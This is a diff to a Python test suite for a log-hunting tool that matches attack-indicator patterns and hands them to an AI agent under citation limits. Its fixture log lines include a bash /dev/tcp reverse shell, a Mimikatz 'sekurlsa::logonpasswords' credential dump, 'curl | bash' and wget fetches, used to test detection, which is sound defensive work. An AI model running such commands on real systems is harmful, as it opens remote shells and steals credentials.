@@ -31,7 +31,7 @@ from romulus.evidence.mention_match import (
 )
 from romulus.evidence.mentions import MENTION_LANE
 from romulus.evidence.normalize import normalize_hits
-from romulus.hunt.mentions import MentionScanner
+from romulus.hunt.mentions import NO_TEXT, SCANNED_ALL, MentionScanner
 from romulus.hunt.sweep import Sweep
 from romulus.report import executive, markdown
 from romulus.report.manifest import MANIFEST_SCHEMA, build_manifest, canonical_manifest
@@ -99,7 +99,8 @@ REFUSALS = [
     ({"match": {"anchored": "abcd\\S*e\\S*f\\S*g\\S*h\\S*i"}}, "more than 4 repeats"),
     ({"match": {"anchored": "abcd.*x"}}, "open gaps"),
     ({"match": {"anchored": "abcd[^ ]{0,200}x.{0,200}"}}, "sum to 400"),
-    ({"match": {"anchored": "abcd\\S*\\S*\\S*x"}}, "backtrack too far"),
+    ({"match": {"anchored": "abcd\\S*\\S*\\S*x"}}, "two repeats"),
+    ({"match": {"anchored": "abcd[e-w]*[e-w]*[e-w]*[e-w]*X"}}, "two repeats"),
     ({"telemetry": ["any", "linux_text"]}, "stands alone"),
     ({"id": "mention.two.parts"}, "id"),
     ({"match": {"anchored": "[a-z]+foo"}}, "literal prefix"),
@@ -206,7 +207,7 @@ def test_a_pathological_line_stays_within_the_backtracking_bound(tmp_path):
     # two unbounded repeats (the most admitted), against a line built to make them backtrack
     worst = _pattern(id="mention.t_worst", match={"anchored": "abcd.{0,170}x.{0,170}y"},
                      examples={"positive": ["abcd x y"], "negative": ["abcd y x"]})
-    loose = _pattern(id="mention.t_loose", match={"anchored": "wxyz\\S+\\S+q"},
+    loose = _pattern(id="mention.t_loose", match={"anchored": "wxyz\\S{1,16}\\S{1,16}q"},
                      examples={"positive": ["wxyz ab q"[0:4] + "abq"], "negative": ["wxyz q"]})
     _file(tmp_path, "w.yaml", [worst, loose])
     loaded = load_mention_patterns(tmp_path)
@@ -239,7 +240,7 @@ def test_decoy_prefixes_and_long_windows_are_counted_as_not_ruled_out(tmp_path):
     fixtures.scan(TARGET, CONTRACT, [(_hit(3, "curl " + "-" * 600 + " | bash"), "x"),
                                      (_hit(4, "x" * 900), "x")], None)
     assert fixtures.summary()["not_ruled_out"] == {"prefix_tries_exhausted": 0, "window_cut": 0}
-    assert fixtures.summary()["status"] == "complete"
+    assert fixtures.summary()["status"] == SCANNED_ALL
     fixtures.close()
 
 
@@ -267,10 +268,16 @@ def test_relaxed_rules_and_end_anchors_load_and_match(tmp_path):
 
 
 def test_the_shipped_pattern_corpus_loads_without_a_refused_file():
-    import romulus.content.mention_patterns as module
-    shipped = Path(module.__file__).resolve().parents[3] / "content" / "mentions"
-    loaded = load_mention_patterns(shipped)
+    from tests.conftest import SHIPPED_MENTION_DIR
+    # the corpus is expected once its own validator (tests/test_mention_patterns.py) is in the tree: then a missing
+    # directory fails here rather than reading as a hunt with nothing to scan
+    expected = (Path(__file__).parent / "test_mention_patterns.py").exists()
+    if not SHIPPED_MENTION_DIR.is_dir():
+        assert not expected, f"the shipped mention corpus is expected at {SHIPPED_MENTION_DIR} and is missing"
+        pytest.skip("the shipped mention corpus is not in this tree yet")
+    loaded = load_mention_patterns(SHIPPED_MENTION_DIR)
     assert loaded.refused == [], loaded.refused
+    assert loaded.patterns, "the shipped corpus loaded no pattern"
 
 
 def test_a_long_line_is_scanned_to_the_bound_and_the_rest_counted():
@@ -330,7 +337,7 @@ def test_identical_lines_group_with_a_count_and_their_time_span(tmp_path):
     web = next(row for row in rows if row[2] == "web1")
     assert web[4] < web[5]                                   # first and last time
     summary = scanner.summary()
-    assert summary["status"] == "complete" and summary["lines_matched"] == 3 and summary["groups_kept"] == 2
+    assert summary["status"] == SCANNED_ALL and summary["lines_matched"] == 3 and summary["groups_kept"] == 2
     scanner.close()
 
 
@@ -420,7 +427,7 @@ def test_records_without_text_and_cut_lines_are_counted_not_scanned(tmp_path):
     long = _hit(2, "x" * (MAX_SCAN_CHARS + 5) + " MIMIKATZ")
     scanner.scan(TARGET, _Contract(), [(no_text, "x"), (long, "x")], None)
     summary = scanner.summary()
-    assert summary["not_scanned"]["no_text_field"] == 1
+    assert summary["not_scanned"]["records"] == {NO_TEXT: 1}
     assert summary["not_scanned"]["lines_cut_at_bound"] == 1 and summary["not_scanned"]["chars_past_bound"] == 14
     assert summary["status"] == "partial" and summary["lines_matched"] == 0
     scanner.close()
@@ -613,9 +620,9 @@ SWEEP_HITS = [
 
 @pytest.fixture
 def swept(tmp_path, monkeypatch):
-    monkeypatch.setenv("ROMULUS_MENTION_DIR", str(FIXTURES))
     repo = _repo(tmp_path / "hunt.sqlite")
-    client = ElasticClient(Settings(es_url="http://es.invalid"), transport=httpx.MockTransport(TextES(SWEEP_HITS)))
+    client = ElasticClient(Settings(es_url="http://es.invalid", mention_dir=FIXTURES),
+                           transport=httpx.MockTransport(TextES(SWEEP_HITS)))
     contracts = {TARGET: contract_from_types(TARGET, {"@timestamp": "date", "event.dataset": "keyword",
                                                       "host.name": "keyword", "message": "text"})}
     sweep = Sweep(repo, client, "h1", WINDOW, contracts, stage_dir=tmp_path / "stage")
@@ -632,7 +639,7 @@ def test_the_sweep_publishes_a_ranked_labelled_pool_and_its_raw_citations(swept,
     raws = repo.agent_raw_records("h1", [row["raw_id"] for row in rows])
     assert [raw["origin"] for raw in raws] == ["mention_sweep", "mention_sweep"]
     assert all(raw["id"].startswith("rr-") for raw in raws)
-    assert sweep.stats["mentions"]["status"] == "complete"
+    assert sweep.stats["mentions"]["status"] == SCANNED_ALL
     assert repo.mention_scan("h1")["lines_matched"] == 3
     # the sweep's raw records never use the agent's raw-record cap
     assert repo.agent_raw_record_stats("h1")["stored"] == 0
@@ -651,7 +658,8 @@ def test_a_mention_never_becomes_a_finding_entity_rank_or_attack_fact(swept):
     assert manifest["schema"] == MANIFEST_SCHEMA == "report-manifest@2"
     assert manifest["findings"] == [] and MENTION_LANE not in manifest["lane_counts"]
     pool = manifest["mentions"]
-    assert pool["lane"] == MENTION_LANE and pool["total"] == 2 and pool["status"] == "complete"
+    assert pool["lane"] == MENTION_LANE and pool["total"] == 2 and pool["status"] == SCANNED_ALL
+    assert pool["status_text"] == "scanned every offered record"
     for item in pool["items"]:
         assert item["kind"] == "mention" and "not an action" in item["label"]
         assert "attack" not in item and "entities" not in item
@@ -719,7 +727,9 @@ def test_the_agent_sees_a_labelled_slice_and_pages_the_pool_but_cannot_cite_it(s
     assert page["mentions"]["total"] == 2 and "not an action" in page["mentions"]["rule"]
     assert [item["pattern"] for item in page["mentions"]["items"]] == [
         "mention.test_dev_tcp_redirect", "mention.test_mimikatz"]
-    assert page["safety"]["flags"], "the injection-shaped line is flagged"
+    # the injection-shaped text is flagged beside its own item
+    flagged = [item for item in page["mentions"]["items"] if item.get("safety_flags")]
+    assert [item["pattern"] for item in flagged] == ["mention.test_mimikatz"] and flagged[0]["suspicious_content"]
     toolbox = Toolbox(repo, "h1")
     result = toolbox.execute("list_mentions", {})
     assert result["counts"] == {"returned": 2, "total": 2} and result["data"]["safety_flags"]
@@ -735,7 +745,7 @@ def test_the_agent_sees_a_labelled_slice_and_pages_the_pool_but_cannot_cite_it(s
 def test_a_sweep_run_again_replaces_the_pool(swept, tmp_path, monkeypatch):
     repo, _sweep = swept
     first = [row["id"] for row in repo.mentions("h1")]
-    client = ElasticClient(Settings(es_url="http://es.invalid"),
+    client = ElasticClient(Settings(es_url="http://es.invalid", mention_dir=FIXTURES),
                            transport=httpx.MockTransport(TextES(SWEEP_HITS[:1])))
     contracts = {TARGET: contract_from_types(TARGET, {"@timestamp": "date", "event.dataset": "keyword",
                                                       "host.name": "keyword", "message": "text"})}
@@ -757,9 +767,16 @@ def test_the_agent_reusing_a_sweep_record_makes_it_its_own(swept):
     hit = {"_index": row["target"], "_id": row["native_id"], "_source": {"message": "x"}}
     agent_row = build_raw_record("h1", hit, source_kind="index", time_field=None, session_id="s1", task_id=None,
                                  query_digest="q", query_text="{}", redact=lambda v: v, flagged=lambda v: [])
+    # at the agent's cap the sweep's row stays the sweep's: the agent's cap is never passed by a flip
+    kept, refused = repo.save_agent_raw_records("h1", [agent_row], max_count=0)
+    assert kept == [] and refused == 1
+    assert repo.agent_raw_records("h1", [row["raw_id"]])[0]["origin"] == "mention_sweep"
     kept, refused = repo.save_agent_raw_records("h1", [agent_row], max_count=5)
     assert kept == [row["raw_id"]] and refused == 0
-    assert repo.agent_raw_records("h1", kept)[0]["origin"] == "agent"
+    flipped = repo.agent_raw_records("h1", kept)[0]
+    # the row now carries the agent's own provenance: its session, task and query
+    assert flipped["origin"] == "agent" and flipped["session_id"] == "s1" and flipped["query"] == "{}"
+    assert flipped["query_digest"] == "q"
     assert repo.agent_raw_record_stats("h1")["stored"] == 1
 
 
@@ -880,6 +897,7 @@ def _sweep_kept(repo: Repo, hit: dict, *, rank: int = 1) -> dict:
         "host": "web01", "target": hit["_index"], "native_id": hit["_id"],
         "raw_id": raw_record_id("h1", hit["_index"], hit["_id"]), "first_ts": T0, "last_ts": T0, "count": 1,
         "pattern_hosts": 1, "pattern_lines": 1, "line": hit["_source"].get("message", ""), "line_chars": 10,
+        "line_offset": 0, "match_offset": 0,
         "line_cut": False, "suspicious_content": False, "created_at": T0,
     }
     repo.replace_mentions("h1", [(mention, {**raw, "origin": "mention_sweep"})], {"status": "complete"})
@@ -916,6 +934,11 @@ def test_a_sweep_record_the_agent_queries_itself_is_at_most_a_lead_mention_and_n
                                                    "cites": raws, "lane": "urgent"})
     assert proposed["status"] == "complete" and proposed["data"]["lane"] == "lead"
     assert proposed["data"]["claim_type"] == "mention"
+    # what the lane note promises (test_the_lane_note_says_what_admission_does_with_a_raw_only_agent_claim): a lead
+    # resting on raw text is the agent's, labelled a mention, with low confidence and no technique
+    finding = repo.candidate(AliasBook(repo, "h1").resolve(proposed["data"]["finding"], {"F"}))
+    assert finding["provenance"] == "agent" and finding["confidence"] == "low"
+    assert finding["claim_type"] == "mention" and not (finding["gate_results"] or {}).get("_attack")
     opened = toolbox.execute("open_hypothesis", {"statement": "An implant beacons from web01 to 10.9.9.9"})
     admission.issue_aliases(opened, tool_name="open_hypothesis")
     for status, field in (("supported", "add_support"), ("refuted", "add_contradiction")):
@@ -926,7 +949,7 @@ def test_a_sweep_record_the_agent_queries_itself_is_at_most_a_lead_mention_and_n
     assert repo.mentions("h1")[0]["raw_id"] == mention["raw_id"]
 
 
-def test_the_orient_page_carries_the_mention_slice_ahead_of_findings_and_keeps_its_scope(tmp_path):
+def test_the_dossier_lists_findings_then_the_mention_slice_and_keeps_its_scope(tmp_path):
     from romulus.agent.dossier import MENTION_DOSSIER_LIMIT, build_dossier
     from tests.test_agent_dossier import _repo as finding_repo
 
@@ -939,6 +962,7 @@ def test_the_orient_page_carries_the_mention_slice_ahead_of_findings_and_keeps_i
             "telemetry": "linux_text", "telemetry_fit": True, "host": "web01", "target": "host-index", "native_id": f"n{rank}",
             "raw_id": f"rr-{rank:024d}", "first_ts": T0, "last_ts": T0, "count": rank, "pattern_hosts": 1,
             "pattern_lines": rank, "line": f"line {rank} " + "y" * 300, "line_chars": 310, "line_cut": False,
+            "line_offset": 0, "match_offset": 0,
             "suspicious_content": False, "created_at": T0,
         }
         raw = {"id": mention["raw_id"], "hunt_id": "h1", "target": "host-index", "native_id": f"n{rank}",
@@ -948,10 +972,261 @@ def test_the_orient_page_carries_the_mention_slice_ahead_of_findings_and_keeps_i
         rows.append((mention, raw))
     repo.replace_mentions("h1", rows, {"status": "partial"})
     small = build_dossier(repo, "h1", token_budget=2_500)
-    page = small.page(1)
     assert len(small.pages) > 1, "the findings overflow the first page"
-    assert [item["rank"] for item in page["mentions"]["items"]] == list(range(1, MENTION_DOSSIER_LIMIT + 1))
+    # every page's header carries the pool and how to page it; the slice follows the findings
+    page = small.page(1)
     assert page["mentions"]["total"] == 15 and page["mentions"]["status"] == "partial"
+    assert "list_mentions" in page["mentions"]["rule"]
+    seen_findings, ranks = False, []
+    for number in range(1, len(small.pages) + 1):
+        current = small.page(number)
+        if current.get("findings"):
+            assert not ranks, "findings come before mentions"
+            seen_findings = True
+        ranks.extend(item["rank"] for item in (current.get("mentions") or {}).get("items") or [])
+    assert seen_findings and ranks == list(range(1, MENTION_DOSSIER_LIMIT + 1))
     # the investigate prompt's small dossier still carries its scope
     tiny = build_dossier(repo, "h1", token_budget=1_000)
     assert tiny.payload.get("scope") and tiny.payload["mentions"]["total"] == 15
+
+
+# ---- review fixes: honest coverage, exact accounting, the text read, the budget, the cap's hosts ---------------------
+
+def test_journal_json_is_read_by_its_message_and_a_json_record_without_one_is_never_scanned(tmp_path):
+    from romulus.hunt.mentions import JSON_RECORD
+    journal = {"_index": TARGET, "_id": "j1", "_source": {
+        "@timestamp": T0.isoformat(), "event": {"dataset": "systemd.journal"}, "host": {"name": "web1"},
+        "event.original": json.dumps({"MESSAGE": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "_PID": "4",
+                                      "SYSLOG_IDENTIFIER": "sh"})}}
+    other_json = {"_index": TARGET, "_id": "j2", "_source": {
+        "@timestamp": T0.isoformat(), "host": {"name": "web1"},
+        "event": {"original": json.dumps({"cmd": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"})}}}
+    nxlog = {"_index": TARGET, "_id": "n1", "_source": {
+        "@timestamp": T0.isoformat(), "Hostname": "WS9", "Message": "MIMIKATZ sekurlsa::logonpasswords"}}
+    scanner = _scanner(tmp_path)
+    scanner.scan(TARGET, CONTRACT, [(journal, "x"), (other_json, "x"), (nxlog, "x", True)], None)
+    rows = list(scanner.ranked())
+    assert sorted((scanner.patterns.patterns[row[1]].id, row[2]) for row in rows) == [
+        ("mention.test_dev_tcp_redirect", "web1"), ("mention.test_mimikatz", "WS9")]
+    raw = json.loads(next(row[7] for row in rows if row[2] == "web1"))
+    assert "event.original#journal:MESSAGE" in raw["query"]
+    summary = scanner.summary()
+    # a JSON record is never substring-matched: counted as not scanned, and the pool says so
+    assert summary["not_scanned"]["records"] == {JSON_RECORD: 1} and summary["status"] == "partial"
+    scanner.close()
+
+
+def test_a_partition_not_read_in_full_or_a_left_out_source_makes_the_pool_partial(tmp_path):
+    from types import SimpleNamespace
+
+    from tests.test_coverage_truth import HOST_TARGET, FaultyES
+    from tests.test_coverage_truth import _contracts as truth_contracts
+    from tests.test_coverage_truth import _repo as truth_repo
+
+    repo = truth_repo()
+    client = ElasticClient(Settings(es_url="http://es.invalid", mention_dir=FIXTURES),
+                           transport=httpx.MockTransport(FaultyES("timed_out")))
+    sweep = Sweep(repo, client, "h1", WINDOW, truth_contracts(), stage_dir=tmp_path / "stage")
+    sweep.run_target(HOST_TARGET)
+    sweep.finalize()
+    stored = repo.mention_scan("h1")
+    assert stored["status"] == "partial" and stored["unscanned_partitions"]["count"] >= 1
+    assert all("retrieval incomplete" in note["reason"] for note in stored["unscanned_partitions"]["listed"])
+    # sources the fetch filters leave out are named, never silent
+    scanner = _scanner(tmp_path / "s")
+    owner = SimpleNamespace(stats={
+        "linux_text_not_retrieved": {"logs-linux": {"custom.app": "sample incomplete"}},
+        "windows_unassessed": {"logs-win": [{"channel": "Vendor-App/Operational", "provider": "X", "event_id": 1,
+                                             "records": 7},
+                                            {"channel": "Security", "provider": "Microsoft-Windows-Security-Auditing",
+                                             "event_id": 4688, "records": 3}]}}, _windows_selective=set())
+    Sweep._mention_left_out(owner, scanner)
+    names = {(item["target"], item["kind"], item["name"]) for item in scanner.left_out}
+    assert names == {("logs-linux", "dataset", "custom.app"), ("logs-win", "channel", "Vendor-App/Operational")}
+    assert scanner.summary()["status"] == "partial"
+    scanner.close()
+
+
+def test_a_kept_group_counted_past_the_pair_bound_is_still_published(tmp_path, monkeypatch):
+    import romulus.hunt.mentions as scanner_module
+    monkeypatch.setattr(scanner_module, "MAX_SEEN_PAIRS", 3)
+    repo = _repo()
+    scanner = _scanner(tmp_path, max_per_hunt=3)
+    weak = [_hit(n, f"wget http://198.51.100.{n}/a", host=f"h{n}") for n in range(3)]
+    strong = _hit(9, "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", host="h9")
+    scanner.scan(TARGET, CONTRACT, [(hit, "x") for hit in [*weak, strong]], None)
+    summary = scanner.publish(repo)
+    rows = repo.mentions("h1")
+    assert "mention.test_dev_tcp_redirect" in [row["pattern_id"] for row in rows]
+    assert len(rows) == 3
+    kept = sum(row["count"] for row in rows)
+    assert kept + summary["lines_not_kept"] == summary["lines_matched"] == 4
+    assert all("()" not in reason for reason in summary["reasons"])
+    assert any("per_hunt" in reason for reason in summary["reasons"])
+    scanner.close()
+
+
+def test_the_pool_gives_its_disk_back_when_a_detection_writer_needs_it(tmp_path):
+    from romulus.detect.bounded import StateBudget
+
+    budget = StateBudget(tmp_path, disk_total=64 * 2**20)
+    detection = budget.account("some_rule")
+    scanner = MentionScanner("h1", load_mention_patterns(FIXTURES), stage_dir=tmp_path, budget=budget)
+    padding = "p" * 6_000
+    scanner.scan(TARGET, CONTRACT, [(_hit(n, f"MIMIKATZ {n} {padding}", host=f"h{n % 50}"), "x")
+                                    for n in range(1_500)], None)
+    pool = scanner._size
+    assert pool > 4 * 2**20
+    # a detection store has written up to the ceiling and needs more room
+    budget.physical_account(detection, budget.disk_total - budget.physical_used - 2**20)
+    needed = 3 * 2**20
+    budget.reclaim_citations(needed)
+    assert budget.disk_total - budget.physical_used >= needed
+    assert scanner._size < pool and budget.new_key_reason(detection) == ""
+    summary = scanner.summary()
+    assert summary["records_reclaimed_for_detection"] > 0 and summary["status"] == "partial"
+    assert any("give disk to detection" in reason for reason in summary["reasons"])
+    repo = _repo()
+    scanner.publish(repo)
+    released = [raw for raw in repo.agent_raw_records("h1", [row["raw_id"] for row in repo.mentions("h1")])
+                if "released to give disk" in raw["text"]]
+    assert released and all(raw["text_cut"] for raw in released)
+    scanner.close()
+
+
+def test_a_rare_host_takes_a_place_at_a_patterns_cap_and_every_lost_host_is_paged(tmp_path):
+    repo = _repo()
+    scanner = _scanner(tmp_path, max_per_pattern=50)
+    busy = [_hit(n, f"bash -i >& /dev/tcp/10.0.0.{n % 250}/{n} 0>&1", host="hostA") for n in range(50)]
+    rare = _hit(999, "bash -i >& /dev/tcp/10.9.9.9/443 0>&1", host="hostB")
+    scanner.scan(TARGET, CONTRACT, [(hit, "x") for hit in [*busy, rare]], None)
+    summary = scanner.publish(repo)
+    hosts = [row["host"] for row in repo.mentions("h1", limit=100)]
+    assert "hostB" in hosts and len(hosts) == 50
+    assert summary["hosts_with_strong_lines_not_kept"] == 1
+    losses = repo.mention_losses("h1")
+    assert [(row["host"], row["strength"], row["lines_not_kept"]) for row in losses] == [("hostA", "strong", 1)]
+    scanner.close()
+
+
+def test_a_scan_that_raises_never_ends_the_sweep(tmp_path, monkeypatch):
+    repo = _repo(tmp_path / "hunt.sqlite")
+    client = ElasticClient(Settings(es_url="http://es.invalid", mention_dir=FIXTURES),
+                           transport=httpx.MockTransport(TextES(SWEEP_HITS)))
+    sweep = Sweep(repo, client, "h1", WINDOW, {TARGET: CONTRACT}, stage_dir=tmp_path / "stage")
+
+    def broken(*_args, **_kwargs):
+        raise RuntimeError("boom")
+    monkeypatch.setattr(sweep.mentions, "scan", broken)
+    sweep.run_target(TARGET)
+    sweep.finalize()
+    stored = repo.mention_scan("h1")
+    assert stored["status"] == "partial" and sweep.stats["records"] == len(SWEEP_HITS)
+    assert any("the scan failed (RuntimeError: boom)" in note["reason"]
+               for note in stored["unscanned_partitions"]["listed"])
+
+
+def test_a_payload_deep_in_a_long_line_is_found_and_shown_around_its_match(tmp_path):
+    from romulus.report.mentions import mention_item
+
+    line = "x" * 9_000 + " bash -i >& /dev/tcp/10.0.0.1/4444 0>&1 " + "y" * 2_960
+    assert len(line) == 12_000 or len(line) > 11_900
+    repo = _repo()
+    scanner = _scanner(tmp_path)
+    scanner.scan(TARGET, CONTRACT, [(_hit(1, line), "x")], None)
+    scanner.publish(repo)
+    row = repo.mentions("h1")[0]
+    assert row["pattern_id"] == "mention.test_dev_tcp_redirect"
+    item = mention_item(row, line_chars=120)
+    assert "/dev/tcp/10.0.0.1" in item["line"] and item["line_from"] > 8_000 and item["line_cut"]
+    assert item["raw_label"].startswith("raw record, not normalized, kept by the mention sweep")
+    scanner.close()
+
+
+def test_a_match_that_reaches_the_window_edge_inside_a_longer_line_is_not_a_hit(tmp_path):
+    edge = _pattern(id="mention.t_edge", match={"anchored": r"abcd[a-z]{1,600}\b"},
+                    examples={"positive": ["abcdef!"], "negative": ["abc def"]})
+    _file(tmp_path, "e.yaml", [edge])
+    matcher = MentionMatcher(load_mention_patterns(tmp_path).compiled)
+    unresolved: set = set()
+    assert matcher.match("abcd" + "a" * 1_000, unresolved=unresolved) == [] and unresolved == {"window_cut"}
+    assert matcher.match("abcd" + "a" * 100 + " tail") == [0]
+
+
+def test_a_probe_line_built_from_a_repeats_class_catches_what_examples_miss():
+    import re as regex
+
+    from romulus.content.mention_patterns import PROBE_LIMIT_SECONDS, probe
+    # the examples alone never make it backtrack; a run of its own class does
+    slow = regex.compile(r"abcd[e-w]*[e-w]*[e-w]*[e-w]*X")
+    assert probe(slow, ["abcdX"]) < PROBE_LIMIT_SECONDS
+    assert probe(slow, ["abcdX"], "abcd", ["e"]) > PROBE_LIMIT_SECONDS
+
+
+def test_the_pattern_set_is_pinned_and_a_changed_file_is_named(tmp_path):
+    from romulus.content.mention_patterns import pattern_pin
+    pin = pattern_pin(load_mention_patterns(FIXTURES))
+    assert pin["files"][0]["name"] == "fixture_patterns.yaml" and pin["digest"] != "none"
+    changed = {**pin, "files": [{**pin["files"][0], "digest": "0" * 64}]}
+    scanner = MentionScanner("h1", load_mention_patterns(FIXTURES), stage_dir=tmp_path, pinned=changed)
+    summary = scanner.summary()
+    assert summary["pattern_changes"] == ["fixture_patterns.yaml (changed)"] and summary["status"] == "partial"
+
+
+def test_the_pattern_directory_comes_from_the_settings():
+    from romulus.config import load_settings
+    from romulus.content.mention_patterns import mention_dir
+    settings = load_settings(environ={"ROMULUS_MENTION_DIR": str(FIXTURES)})
+    assert settings.mention_dir == FIXTURES and mention_dir(settings) == FIXTURES
+    assert load_mention_patterns(settings=settings).patterns
+
+
+def test_the_lane_note_says_what_admission_does_with_a_raw_only_agent_claim():
+    from romulus.agent.admission import RAW_ONLY_NOTE
+    from romulus.report.mentions import LANE_NOTE
+    # a pool mention never reaches a reportable lane on its own; a lead resting on raw text only comes from the agent
+    # reading the record itself, labelled a mention, with low confidence and no technique
+    # (pinned against admission by test_a_sweep_record_the_agent_queries_itself_is_at_most_a_lead_mention_...)
+    assert "never reaches a reportable lane on its own" in LANE_NOTE
+    for words in ("AI agent read the raw record itself", "labelled a mention", "low confidence",
+                  "no ATT&CK technique"):
+        assert words in LANE_NOTE, words
+    assert "raw records" in RAW_ONLY_NOTE
+
+
+def test_the_same_hunt_with_and_without_patterns_differs_only_in_its_mentions(tmp_path_factory, monkeypatch):
+    import romulus.content.mention_patterns as patterns_module
+    from tests import throughput_fixture as tf
+
+    corpus = tmp_path_factory.mktemp("corpus")
+    words = _pattern(id="mention.t_common_words", strength="weak",
+                     match={"literal": ["linux version", "structured record"]}, case_sensitive=False,
+                     examples={"positive": ["Linux version 6"], "negative": ["nothing"]})
+    _file(corpus, "a.yaml", [words])
+    (corpus / "fixture_patterns.yaml").write_bytes((FIXTURES / "fixture_patterns.yaml").read_bytes())
+
+    def run(directory):
+        with pytest.MonkeyPatch.context() as patch:
+            tf.patched_sizes(patch)
+            patch.setattr(patterns_module, "SHIPPED_DIR", directory)
+            return tf.run_stack(tmp_path_factory.mktemp("stack"))
+
+    with_patterns, without = run(corpus), run(tmp_path_factory.mktemp("empty"))
+
+    def strip(snapshot):
+        snapshot = json.loads(json.dumps(snapshot))
+        snapshot["stats"].pop("mentions", None)
+        for row in snapshot["audit"]:
+            if isinstance(row.get("detail"), dict) and isinstance(row["detail"].get("stats"), dict):
+                row["detail"]["stats"].pop("mentions", None)
+        manifest = snapshot["manifest"]
+        manifest.pop("mentions", None)
+        manifest.get("versions", {}).pop("mention_patterns", None)
+        manifest.pop("schema", None)
+        return snapshot
+
+    assert with_patterns["stats"]["mentions"]["lines_matched"] > 0, "the fixture hunt must hold mentions"
+    a, b = strip(with_patterns), strip(without)
+    assert sorted(a) == sorted(b)
+    for key in sorted(a):
+        assert a[key] == b[key], key
